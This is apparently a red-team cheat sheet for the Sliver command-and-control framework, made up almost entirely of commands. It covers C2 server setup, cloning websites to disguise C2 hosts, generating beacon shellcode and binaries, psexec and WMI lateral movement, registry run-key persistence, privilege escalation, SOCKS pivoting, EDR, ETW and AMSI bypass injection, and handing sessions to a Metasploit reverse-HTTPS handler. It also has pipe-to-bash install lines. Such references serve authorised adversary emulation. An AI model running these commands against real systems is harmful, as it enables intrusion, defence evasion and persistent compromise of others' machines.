# Sliver 

> Sliver, an open-source cross-platform adversary emulation and red team framework, enables organizations of all sizes to conduct security testing. Sliver implants support various communication channels, including Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. These implants are dynamically compiled and possess unique X.509 certificates signed by a per-instance certificate authority generated upon initial binary execution. Both Sliver server and client applications run on macOS, Windows, and Linux. Implant compatibility extends to these same operating systems.

## Installation
```
curl https://sliver.sh/install|sudo bash
```

## Summary
- [Sliver](#sliver)
  - [Installation](#installation)
  - [Summary](#summary)
  - [Sliver Service](#sliver-service)
    - [Restart Deamon \& Start Sliver](#restart-deamon--start-sliver)
    - [Install Letsencrypt](#install-letsencrypt)
    - [Setup Letsencrypt](#setup-letsencrypt)
    - [Create a New Website](#create-a-new-website)
  - [Team Server](#team-server)
      - [Create New Operator](#create-new-operator)
    - [Connect to Team Server](#connect-to-team-server)
    - [Create New Listener](#create-new-listener)
      - [MTLS](#mtls)
      - [HTTPS](#https)
    - [HTTPS Domain](#https-domain)
      - [HTTP](#http)
  - [Payload Creation](#payload-creation)
    - [Generate Shellcode](#generate-shellcode)
    - [Generate Binary](#generate-binary)
  - [Post Exploitation](#post-exploitation)
    - [Beacon](#beacon)
    - [Sessions](#sessions)
    - [Kill All Session](#kill-all-session)
    - [Lateral Movement](#lateral-movement)
      - [SMB Listener](#smb-listener)
      - [PSEXEC Lateral Movement](#psexec-lateral-movement)
      - [WMI Lateral Movement](#wmi-lateral-movement)
  - [Internal Reconnaissance](#internal-reconnaissance)
      - [Situational Awareness - Local](#situational-awareness---local)
      - [Situational Awareness - Domain](#situational-awareness---domain)
  - [Privilege Escalation](#privilege-escalation)
  - [Persistence](#persistence)
  - [Pivoting](#pivoting)
    - [Socks Proxy](#socks-proxy)
  - [Defense Evasion](#defense-evasion)
    - [EDR Bypass](#edr-bypass)
    - [ETW Bypass](#etw-bypass)
    - [AMSI Bypass](#amsi-bypass)
  - [Session Passing](#session-passing)
    - [Install Metasploit](#install-metasploit)
    - [Setup Metasploit Handler](#setup-metasploit-handler)
    - [Inject Metasploit](#inject-metasploit)
  - [Misc](#misc)
    - [Install Extension From Local](#install-extension-from-local)
    - [Install Extension Using Armory](#install-extension-using-armory)


## Sliver Service
```
cat > /etc/systemd/system/sliver.service << EOL
[Unit]
Description=Sliver Server
After=syslog.target network.target

[Service]
Type=simple
Restart=always
RestartSec=120
LimitNOFILE=20000
Environment=LANG=en_US.UTF-8
ExecStart=/opt/sliver/sliver-server_linux daemon -l 0.0.0.0 -p <port>

[Install]
WantedBy=multi-user.target
EOL
```

### Restart Deamon & Start Sliver
```
systemctl daemon-reload
systemctl enable --now sliver 
```

### Install Letsencrypt
```
apt install letsencrypt -y
```

### Setup Letsencrypt
```
apt install apache2 -y
certbot certonly --non-interactive --quiet --register-unsafely-without-email --agree-tos -a webroot --webroot-path=/var/www/html -d <domain>
```
### Create a New Website

Clone website with wget.
```
wget --mirror --convert-links --html-extension <target>
```

Add content to HTTP(S) C2 websites to make them look more legit.
```
websites add-content --website <name> --web-path <path> --content ./public --recursive
```

## Team Server


#### Create New Operator
```
./sliver-server_linux operator -l <teamserver_ip> -p <teamserver_port> -n <username> -s /tmp/<username>.cfg
```
---
### Connect to Team Server
```
sliver-client import /tmp/<username>.cfg
sliver-client
```

### Create New Listener

#### MTLS
``` 
mtls -l 443 -L 0.0.0.0 -p
```

#### HTTPS
```
https -l 443 -L 0.0.0.0 -p
```

### HTTPS Domain
```
https --domain <domain> --cert /path/cert.pem --key /path/privkey.pem --website <website_name> -p
```

#### HTTP
```
http -l 80 -L 0.0.0.0 -p
```
---

## Payload Creation

### Generate Shellcode
```
generate beacon --mtls <ip address>:<port> -f shellcode
```

### Generate Binary
```
generate beacon --http <ip address>:<port>
```

## Post Exploitation

### Beacon
```
use <beacon_id>
```

### Sessions
Switching from Beacon Mode to Session Mode
```
sessions
use <sessions_id>
interactive
```

### Kill All Session
```
sessions -F -K
```
---

### Lateral Movement

#### SMB Listener
```
pivots named-pipe --bind <named_pipe>
profiles new --format service --named-pipe <local_ip>/pipe/<named_pipe> svc-smb-beacon
```

#### PSEXEC Lateral Movement
```
psexec -d Description -s PAEXEC -p svc-smb-beacon <remote_computer>
```

#### WMI Lateral Movement
```
sharp-wmi 'action=exec computername=<remote_computer> command="C:\windows\temp\xxx.exe" result=true'
```
---

## Internal Reconnaissance 

#### Situational Awareness - Local
```
seatbelt -p C:\\Windows\\System32\\werfault.exe -- "-group=user"
```

#### Situational Awareness - Domain
```
sharp-hound-3 -- -c all 
```
---

## Privilege Escalation
```
sharpup -t 120 -p C:\\Windows\\System32\\werfault.exe audit
```
---
## Persistence
```
sharpersist -- '-t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add'
```
---
## Pivoting

### Socks Proxy
```
interactive
use <session>
socks5 start
```
---
## Defense Evasion
To run this command need to install extension windows-bypass
### EDR Bypass
```
unhook-boof
```
### ETW Bypass
```
inject-etw-bypass <pid>
```

### AMSI Bypass
```
inject-amsi-bypass <pid>
```
---

## Session Passing
Session passing is using one payload to spawn another payload.
### Install Metasploit
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
### Setup Metasploit Handler
```
use exploit/multi/handler 
set payload windows/x64/meterpreter_reverse_https
set lhost <msf_ip>
set lport <msf_port>
exploit -jz
```

### Inject Metasploit
```
msf --lhost <msf_ip> --lport <msf_port>
```

## Misc

### Install Extension From Local
```
extensions install /path/bof
```

### Install Extension Using Armory 
```
armory install windows-bypass
armory install windows-pivot
armory install situational-awareness
armory install .net-execute
armory install .net-pivot
armory install .net-recon
```
